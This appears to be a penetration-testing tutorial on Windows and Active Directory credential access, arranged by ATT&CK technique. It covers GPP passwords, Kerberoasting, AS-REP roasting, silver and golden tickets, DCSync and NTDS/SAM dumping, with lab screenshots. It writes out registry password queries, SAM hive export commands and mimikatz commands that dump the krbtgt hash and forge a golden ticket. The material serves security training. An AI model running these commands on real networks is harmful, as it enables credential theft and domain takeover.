Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. Bash History), operating system or application-specific repositories (e.g. Credentials in Registry), or other specialized files/artifacts (e.g. Private Keys).

### group-policy-preferences

Adversaries may attempt to find unsecured credentials in Group Policy Preferences(GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.

These group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).

The following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:

·         Metasploit's post exploitation module: post/windows/gather/credentials/gpp

·         Get-GPPPassword

·         Gppredecrypt.py

On the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: dir /s * .xml

References:

**This site explains it way better and has incredible demonstrations easy to follow.**

Finding Passwords in SYSVOL & Exploiting Group Policy Preferences

Active Directory Security

​

### private-keys

Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. Common key certificate file extensions include: .key, .pgp, .gpg, .ppk, .p21, .pem, .pfx, .cer, .p7b, .asc.

Adversaries may also look commonly key directories, such as ~/.shh for SSH keys on * nix-based systems or C:\Users\(username)\.ssh\ on Windows. These private keys can be used to authenticate to Remote Services like SSH or for use in decrypting other collected files such as email.

Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates.

Some private keys require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line.

**Example**

Even though its uncommon but not impossible there are Windows SSH Server's that allow users to SSH onto their machines. An example of this is BitVise an SSH Server for Windows machines

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkqJUdsDmRWPLqweMD%2F-MRkqR-CkIhYb2acZmIL%2Fimage.png?alt=media&token=715daa56-afd3-4c1d-97b3-7a041bd35e55)

Scanning our machine gives us an SSH info for Windows

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkqJUdsDmRWPLqweMD%2F-MRkqSUs99h4JDkE-50o%2Fimage.png?alt=media&token=afbf8887-634b-4b3a-9dee-a882bbc05d60)

Some places to search and extensions for are the ones mentioned above or common to SSH we can find our ssh keys in the Windows Folder 

**.ssh**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkqJUdsDmRWPLqweMD%2F-MRkqTERYSKkbKXp3lsD%2Fimage.png?alt=media&token=7d7fdf2c-60f3-45e4-9658-63558516c67c)

To use your SSH keys, copy your 

**public SSH key**

 to the system you want to connect to. Use your 

**private SSH key**

 on your own system. Your private key will match up with the public key, and grant access.

### credentials-in-registry

Adversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.

Example commands to find Registry keys related to password information:

·         Local Machine Hive: reg query HKLM /f password /t REG_SZ /s

·         Current User Hive: reg query HKCU /f password /t REG_SZ /s

**Example**

In this Demo is simply as running both of the commands mentioned with the different permissions available (User and Administrator)

User

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkqAE183WxWCaOBe7f%2F-MRkqGiGwmPekoUPJUV1%2Fimage.png?alt=media&token=4153e085-69c3-4d58-9c7b-cc83209eb755)

Administrator

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkqAE183WxWCaOBe7f%2F-MRkqHRadXI2A98WkZuZ%2Fimage.png?alt=media&token=473db9a8-4711-4b30-8223-4209d1c02c8d)

### credentials-in-files

Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

It is possible to extract passwords from backups or saved virtual machines through OS Credential Dumping. Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.

In cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.

**Example**

Let's not go too far, shall we??. Were here checking out the latest and greatest techniques to Dump Credentials, Capture Hashes, and Exploit Services. But what about just searching for the passwords??.

Here is where SauronEye comes in a great tool, that searches incredibly quick through the entire system for keywords and specific file extension.

**SauronEye.exe -d C:\Users\dwinchester\ --filetypes .txt .docx .xlsx .xls --contents --keywords password pass* -v**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkq3qdWO5cjvJOjaHg%2F-MRkq9ZdiWOKVt9xWBNB%2Fimage.png?alt=media&token=f4c01653-0557-4e17-9a03-443a17105fe5)

References:

​

[https://github.com/vivami/SauronEye](https://github.com/vivami/SauronEye)

## t1558-steal-or-forge-kerberos-tickets

Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable Pass the Ticket.

Kerberos is an authentication protocol widely used in modern Windows domain environments . In Kerberos environment, referred to as "realms", there are three basic participants: clients, service, and Key Distribution Center (KDC). Clients request access to a service and though=rough the exchange of Kerberos tickets.=, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting. Attackers may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.

### as-rep-roasting

Adversaries may reveal credentials of accounts that have disabled Kerberos preauthenticatiion by Password Cracking Kerberos messages.

Preauthentication offers protection against offline Password Cracking. When enabled, a user requesting access to a resource initiates communications with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If any and only if the DC is able to successfully decrypt the timestamp with the hash of the user's password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket(TGT) to the user. Part of the AS-REP message is signed with the user's password.

For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline Password Cracking attacks similarly to Kerberoasting and expose plaintext credentials.

An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like PowerShell with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data.

Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.

**Example**

As worked previously with Kerberoasting we will use Impacket tools to achieve our goal (Please do remember that this can also be achieved with other tools [Rubeus, PowerShell]). We will first find a user with our credentials form a domain user that we already have access to.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRknhWDxO_jGJ9pfuG7%2F-MRkp5ZX3RFnMgjVG9YL%2Fimage.png?alt=media&token=8828597a-2a96-4be7-9f53-7982504afd64)

Once this is achieved we want to save the hash and crack it.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRknhWDxO_jGJ9pfuG7%2F-MRkp6Dp5qpIAkeXNUdJ%2Fimage.png?alt=media&token=75875582-df59-4d5d-84b8-7436b5a6e429)

This is a very great technique when enumerating Domain users and you manage to find a user with the

**DONT_REQ_PREAUTH**

  value and use this technique to gain credentials.

References:

How To Attack Kerberos 101

m0chan Blog - Info Sec, CTF & Hacking

​

### kerberoasting

Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force.

Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically  tasked with running a service).

Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP type 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials.

This same attack could be executed using service tickets captured from network traffic.

Cracked hashes may enable Persistence, Privilege Escalation, and Lateral movement via access to Valid Accounts.

**Example:**

First let us understand Kerberos it ensures a high level of security to network resources. It is compromised by 3 different parties. 

**The Key Distribution Center(KDC),**

 the client user and the server with the desired access. The KDC is installed as part of the domain controller and performs two service functions: the Authentication Service (AS) and the Ticket-Granting Service (TGS).

**AS (Authentication Service) Exchange**

When initially login on to a network, users must negotiate access by providing a log-in name and password in order to be verified by the AS portion of a KDC within their domain. The KDC has access to Active Directory user account information. Once successfully authenticated, the user is granted a Ticket Granting Ticket(TGT) that is valid for the local domain.. The TGT has a default lifetime of 10 hours and may be renewed throughout the users' log-on session without requiring the user to re-enter his password. The TGT is cached on the local machine in volatile memory space and used to request sessions with services throughout the network.

The AS request identifies the client to the KDC in plain text. If preauthentication is enabled, a time stamp will be encrypted using the user's password hash as an encryption key. If the KDC reads a valid time when using the user's password hash (stored in Active Directory) to decrypt the time stamp, the KDC knows that request isn't replay of a previous request. The preauthentication feature may be disabled for a specific user in order to support some applications that don't support the security feature. 

**You can UN-check the "Do not require Kerberos"**

 option in AD.

If the KDC approves the client's request for a TGT, the reply (referred to as the AS reply) will include two sections: a TGT encrypted with a key that only the KDC(TGS) can decrypt and a session key encrypted with the user's password hash to handle future communications with the KDC. Because the client system cannot read the TGT contents, it must blindly present the ticket to the TGS for service tickets. The TGT includes time to live parameters, authorization data, a session key to use when communicating with the client and the client's name.

**TGS Exchange**

The user presents the TGT to the TGS portion of the KDC when desiring access to a server service. The TGS on the KDC authenticates the user's TGT and creates a ticket and session key for both the client and the remote server. This information, known as the service ticket, is then cached locally on the client machine.

The TGS receives the client's TGT and reads it using its own key. If the TGS approves of the client's request, a service ticket is generated for both the client and the target server. The client reads its portion using the TGS session key retrieved earlier from the AS reply. The client presents the server portion if the TGS reply to the target server in the client/server exchange.

**Client/Server Exchange Detail**

The client blindly passes the server portion of the service ticket to the server in the client/server request to establish a client/server session. If mutual authentication is enabled, the target server runs a time stamp encrypted using the service ticket session key. If the time stamp decrypts correctly, not only has the client authenticated himself to the server, but the server also has authenticated to the client. The target server never has to directly communicate with the KDC. This reduces downtime and pressure on the KDC.

A TGT and a service ticket are needed to access services on remote computers, but they also are required to successfully log on to a local system. When the log-on window appears, password encryption using a one-way hash algorithm occurs  immediately and negotiations commence with the KDC for a valid TGT and service ticket. The process is the same as accessing a remote service. An access token is created for the user containing all security groups to wich they belong. This access token is attached to the user's log-on session and is subsequently inherited by any process or application the users starts.

**Referral Tickets**

The AS and TGS functions are separate within the KDC. This permits the user to use the TGT obtained from an ASA in his domain to obtain service tickets from a TGS in other domains. This is accomplished through referral tickets.

Once a trust has been established between two domains, referral tickets can be granted to clients requesting authorizing for services in other domains. When there is a trust established between the two domains, an inter-domain key based on the trust passwords becomes available for authenticating KDC functions. This can be explained by example of a user/client seeking services in another domain. 

**User client in example1.com request authority from a server in example2.com.**

 User utilizes referral tickets.

1.       The client contacts it's domain KDC TGS using a TGT. The KDC recognizes a request for a session with a foreign domain server and responds by returning a referral ticket for the KDC in the foreign domain.

2.       The client contacts the KDC of the foreign domain with the referral ticket. This ticket is encrypted with the inner-domain key. Given that the decryption works, the TGS service for foreign domains returns a service ticket for the server service.

3.       The client performs the client/server exchange with the server and begins the user session with the service.

This is only a very small understanding on what is going on with Kerberos.

**In a nutshell**

Basically, Kerberos comes down to just this:

·         a protocol for authentication

·         uses tickets to authenticate

·         avoids storing passwords locally or sending them over the internet

·         involves a trusted 3rd-party

·         built on symmetric-key cryptography

**Example**

On Kerberoasting let us use an incredible tool named Rubeus, its and Upgrade to some PowerShell tools (Not that they aren't necessary) and really great for various attacks on Active Directory.

First let's find some SPN users which we can use for grabbing there hash. Will use a great tool from Impacket to grab these hashes (

**Please be aware that there are other methods to achieve this and would be great for you to experiment with such as Invoke-Kerberoast with PowerShel**

l)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRknhWDxO_jGJ9pfuG7%2F-MRknqkGL1qH3NpLMW7M%2Fimage.png?alt=media&token=262ceb9e-9719-4373-931c-60aa7da8ecde)

Now let's save this hash and try cracking it with John The Ripper.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRknhWDxO_jGJ9pfuG7%2F-MRknreJJpsESl3o24ai%2Fimage.png?alt=media&token=56289a0f-1f77-4350-be91-b0565ba0e97c)

Above we see the full command for saving the hash.

Now with John the Ripper we pass our custom wordlist (which I recommend to work with instead of random wordlists) and wait for the hash to crack.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRknhWDxO_jGJ9pfuG7%2F-MRknsQ01c5j-UlIVqgp%2Fimage.png?alt=media&token=b4abdde5-c390-4c1c-ad84-416f3288eaaa)

Kerberoasting is an efficient technique for hackers who have limited rights within a domain. Depending on the strength of the passwords, an attacker can quickly gain access to multiple accounts and then use them to launch additional attacks and collect data. The attack itself cannot be prevented, but selecting strong passwords can make it more difficult. Service accounts should therefore be treated much like 

[privileged accounts](https://www.scip.ch/en/?labs.20180920)

. This includes creating a list of service accounts, checking when the password was last changed, as well as implementing a process for changing passwords on a regular basis.

References:

Kerberos, Active Directory’s Secret Decoder Ring

Active Directory Security

Explain like I’m 5: Kerberos

roguelynn

How Kerberoasting is used to steal service account credentials

scipag

​

### silver-ticket

Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.

Silver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detecting more difficult.

Password hashes for target services may be obtained using OS Credential Dumping or Kerberoasting.

**Example**

As mentioned Silver Ticket can be dangerous in there on way since the TGS is forged and no associated to the TGT this means the DC is never contacted. Yes it's more limited to whatever service it's targeted on but that can be sufficient means to reach your goals. Since all the event logs can be spoofed and they are all sent to the targeted server and not the DC this makes it very difficult to track.

Silver Tickets are forged Kerberos Ticket Granting Services (TGS) tickets, also called services tickets. As shown in the following graphic, there is no AS-REQ / AS-REP and no TGS-REQ / TGS-REP communication with the Domain Controller. Since a Silver Ticket is a forged TGS, there is no communication with a Domain controller

Now on this scenario we have a share inaccessible by our domain user that we currently hold 

**DC\Dwinchester**

. But we are aware of another user that can.

**Jwinchester**

, this being since the users is part of the Data Engineers Group

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRknHLW0ewTktX_cBgU%2F-MRknOjCqaazZZc_gfm7%2Fimage.png?alt=media&token=5b64be9a-dc54-40b8-b614-ff7a5889da09)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRknHLW0ewTktX_cBgU%2F-MRknQ6mnJ99olkXzCIk%2Fimage.png?alt=media&token=aeb8ad75-85ca-40fa-8045-e27232ba74d3)

And that folder has permissions for that user. We can see that our current user has no permissions to even check the

permissions itself.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRknHLW0ewTktX_cBgU%2F-MRknQvgG8p_-57tBIxR%2Fimage.png?alt=media&token=5437feae-f4c7-476b-a6ba-a0ca8bf3107f)

Since it's a DB folder we try to search for a user that has DB permissions we already know this with Jwinchester.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRknHLW0ewTktX_cBgU%2F-MRknRpcQTQE1-OanpQ-%2Fimage.png?alt=media&token=90e48e3d-6b59-4759-ad78-a0985fa1b9a4)

John is the perfect candidate, now let's get a ticket for this account. We will use a tool to grab SPNs

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRknHLW0ewTktX_cBgU%2F-MRknYRv4c5K9n2nWNpn%2Fimage.png?alt=media&token=c164800d-8452-4256-a909-e3a2713cade1)

And Request the Ticket

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRknHLW0ewTktX_cBgU%2F-MRknZa_UH9UwmsOWi6a%2Fimage.png?alt=media&token=b7244ec3-5c79-4516-aa44-3abb8d93f5b6)

We will then export the tickets and crack them offline. Crack the ticket and convert it to an NTLM Hash for Demo purposes this is already done.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRknHLW0ewTktX_cBgU%2F-MRkn_QTLw-KDrDNbJX1%2Fimage.png?alt=media&token=a29fc95d-a80b-4056-bf6b-649f029674d6)

Create the Silver Ticket

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRknHLW0ewTktX_cBgU%2F-MRknayHYnYd1CJ2e0Xu%2Fimage.png?alt=media&token=da79f920-4795-4420-9e81-a670498f09fb)

And remember the share we had no access too?. We can now enumerate the files on the Share

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRknHLW0ewTktX_cBgU%2F-MRknbkW4h05cloFmBCt%2Fimage.png?alt=media&token=3be4078c-e71c-4bb3-b87c-929a022c955a)

References:

What is a Silver Ticket Attack? - Forged Service Tickets

Attack Catalog

Downloads

Directory Services Internals

How Attackers Use Kerberos Silver Tickets to Exploit Systems

Active Directory Security

​

### golden-ticket

Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket. Golden tickets enable adversaries to generate authentication material for any account in Active Directory.

Using a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.

The KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets. The KRBTGT password hash may be obtained using OS Credential Dumping and privileged access to a domain controller.

**Example**

As explained the most powerful account on the DC the KRBTGT Account this account is used to create TGT to any service in the Domain Controller, all that is needed (Easy to say) is to compromise the Domain Controller or use any other attack (DCSync) to grab the password hash of this account we can then use mimikatz to create and inject the Ticket to any service that is desired and this attack, is incredible for avoiding logs since these are legitimate TGTs.

Let's see this attack in action, after all the enumeration and all the hacking with all your setup you managed to get a shell on the DC (Domain Controller) and you grab a user, and this user has Administrator Access.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkn6ealF_qjnOzQs2v%2F-MRknDQUK8cRCfUXD9W3%2Fimage.png?alt=media&token=afed3a94-7106-403a-a346-54394439d6bf)

Here we continue with mimikatz and request the hashes for the KRBTGT user. We can see that there are old hashes and the most current one available for the user.

**privilege::debug**

**lsadump::lsa /inject /name:krbtgt**

On the Kali terminal you will need to make this a one-liner so that the mimkatz binary exits properly.

**mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt" exit**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkn6ealF_qjnOzQs2v%2F-MRknEYvJiIMzVoMD1AB%2Fimage.png?alt=media&token=8c86e448-c671-41ef-90c4-f31778d255a3)

Continuing with the attack now we will request a Golden ticket and create a fake user this user will have total access to the DC and other machines, so from here the fake user created will have to permissions to list the folders of the domain controller. It makes no sense to do this attack since the DC and a high level user has been compromised but this is a great opportunity to avoid detection as these forged tickets are legitimate tickets created by the KRBTGT account.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkn6ealF_qjnOzQs2v%2F-MRknFaHJQe-pU_X_x2Y%2Fimage.png?alt=media&token=dbdafe25-70a8-4c42-a637-f02b185618e3)

**mimikatz.exe "kerberos::golden /domain:dc1.dominioncyber.local /sid:S-1-5-21-4198639423-1025486511-2226459690 /rc4:a8bbd83cc1ded03f7db3b07d78e95036 /user:Youllnevercatchme /id:500 /ptt"**

Let's confirm our assumptions.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkn6ealF_qjnOzQs2v%2F-MRknGa7FrgxQ5mNK9bb%2Fimage.png?alt=media&token=e927c593-7bb7-4e4d-811c-20729c1f10b6)

We can list the DC directories and the user was authenticated to it as well, the Ticket is saved in the session and with mimikatz I used the msic::cmdcommand to prompt open a new cmd window with the session in memory this is also a great way to Privesc or to Maintain Persistence on a machine.

## t1003-os-credential-dumping

Adversaries may attempt to dump credentials to obtain account login and credential material, normally on the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.

Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.

### dcsync

Adversaries may attempt to access credentials and other sensitive information abusing a Windows Domain Controller's application programming interface (API) to simulate process from a remote domain controller using a technique called DCSync.

Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data from Active Directory, which may include current and historical hashes potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in Pass the Ticketor change an account's password as noted in Account Manipulation.

DCSync functionality has been included in the "lsadump" module in mimikatz. Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.

**Example**

DCSync an incredible technique that allows us to impersonate a DC (That is correct, impersonate!!) and request for the hashes of the DC.

This technique is an attack that allows to simulate the behavior of the Domain Controller (DC) in order to retrieve password data via domain replication. Utilizing the Microsoft Directory Replication Service Remote Protocol (MS-DRSR) to simulate the behavior of a DC the attack take's advantage of valid and necessary functions of Active Directory, which cannot be turned off or disabled.

**DCSyncer**

A tool built around mimikatz it applies the proper parameters and needed information to execute everything automatically it will dump the hashes for all user's no single hash supported, we need Domain Admins or a user with Replicating Directory Changes and Replicate Directory Changes All once these requirements are met we can achieve this attack, the tool is simple to execute and will do everything automatic.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkmp5ApBoteldonee6%2F-MRkmySyXbnoTZUDBMgp%2Fimage.png?alt=media&token=ab782d2c-1092-45a6-99fc-84e61056fc84)

### cached-domain-credentials

Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.

On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2)hash, known as MS-Cache v2 hash. The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password.

With SYSTEM access, tools/utilities such as Mimikatz, Reg, and secretsdump.py can be used to extract the cached credentials.

Note: Cached credentials for Windows Vista are derived using PBKDF2.

**Example**

We can achieve this as well with mimkatz using the lsadump::cache  module and retrieve the hashes.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklWN6TybjAt83ZVP-%2F-MRkmn_E9rkG6GGq6ssg%2Fimage.png?alt=media&token=58dddff4-908f-4a72-8823-2dcee88a4e4a)

### lsa-secrets

Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets. LSA secrets can also be dumped from memory.

Reg can be used to extract from the Registry. Mimikatz ca be used to extract secrets from memory.

**Example**

A demo utilizing mimikatz for LSA Secrets.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklWN6TybjAt83ZVP-%2F-MRkm33PyanX1BMed4SG%2Fimage.png?alt=media&token=d6f56378-baed-4c15-aad4-a72aaecce009)

Above we see just as the previous Demos we can achieve this by using mimikatz and the SAM and SYSTEM hive files as done previously we need to elevate our privileges to SYSTEM.

Reference:

​

[https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

### ntds

Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in %Systemroot%\NTDS\Ntds.dit of a domain controller.

In addition to looking NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.

The following tools and techniques can be used to enumerate the NTDDS file and the contents of the entire Active Directory hashes.

·         Volume Shadow Copy

·         Secretsdump.py

·         Using the in-built Windows tool ntdsutil.exe

·         Invoke-NinjaCopy

**Example**

We learned previously to achieve this goal with secretsdump but here we have also PowerShell Tools and some built-in tools from Windows itself (LOLBINS) I will work with some demonstration such as Ninja Copy and ntdsutil.exe

**Ntdsutil.exe**

When using the following commands the windows utility ntdsutil will create a copy in a directory created by the Tool which will save the ntds.dit file and we will have access to it.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklWN6TybjAt83ZVP-%2F-MRkluRMipgi6QTviiLR%2Fimage.png?alt=media&token=09eb4b27-3a83-4ef6-8b4b-15c4def07b42)

With this we can continue and grab the SYSTEM Hive from the Registry Key to decrypt the file and extract the hashes. This can be done offline as well. As DSINternal offer a PowerShell Module that can be used to interact with the file and extract the password hashes.

**Sample**

Sample

:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklWN6TybjAt83ZVP-%2F-MRklvMsKGzMmNdKyr-y%2Fimage.png?alt=media&token=16cd97ac-2e3b-4644-b72c-b93631633036)

References:

​

[https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/](https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/)

https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/

https://pentestlab.blog/tag/ntds-dit/

[https://pentestlab.blog/tag/ntds-dit/](https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/)

### security-account-manager

Adversaries may attempt to extract credential material from the Security Account Manager(SAM) database wither through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local account for the host, typically those found with the 

** net user**

  command. Enumerating the SAM database requires SYSTEM level access.

A number of tools can be used to retrieve the SAM file through in-memory techniques:

·         Pwdumpx.exe

·         Gsecdump

·         Mimikatz

·         Secretsdump.py

Alternatively, the SAM can be extracted from the Registry with Reg:

·         Reg save HKML\sam sam

·         Reg save HKLM\system system

Creddump7 can then be used to process the SAM database locally to retrieve hashes.

Notes: RID 500 account is the local, built-in administrator. RID501 is the guest account. *user accounts start with a RID of 1,000+

**Example**

In this demo will work with secretsdump and mimkatz very well working tools to achieve these goals, will also work with the Registry to obtain the hashes from them.

For example secretsdump we will attack the DC in this occasion we will use Domain Admin credentials and have it dump the hashes of the entire Domain

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklWN6TybjAt83ZVP-%2F-MRkliy8H619kMqfUpdp%2Fimage.png?alt=media&token=ce659dfc-da09-4a35-8828-5e9d5361ec1a)

Above we see the technique successful but be aware that this will NOT dump local accounts only Domain Accounts.

What about mimikatz, dump the SAM and grab credentials as well. To have this attack effective we will need to Dump the SAM Database from Registry.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklWN6TybjAt83ZVP-%2F-MRkljmDxhic8Mt4-Hdf%2Fimage.png?alt=media&token=3ea06d1e-1dc0-4a9c-9c7a-81a2d8536374)

Once running mimkatz we will start the privilege::debug

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklWN6TybjAt83ZVP-%2F-MRklkgcqNxOcHqD9wB6%2Fimage.png?alt=media&token=23d8abfe-51b3-43e0-9f90-75540438a52a)

Then elevate our privileges to system by using the token::elevate

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRklWN6TybjAt83ZVP-%2F-MRkllQeuxTZkLPYiIgJ%2Fimage.png?alt=media&token=43632db6-c837-40b2-9a32-1fe989fb8137)

Then finally grab the creds from the files we save from registry

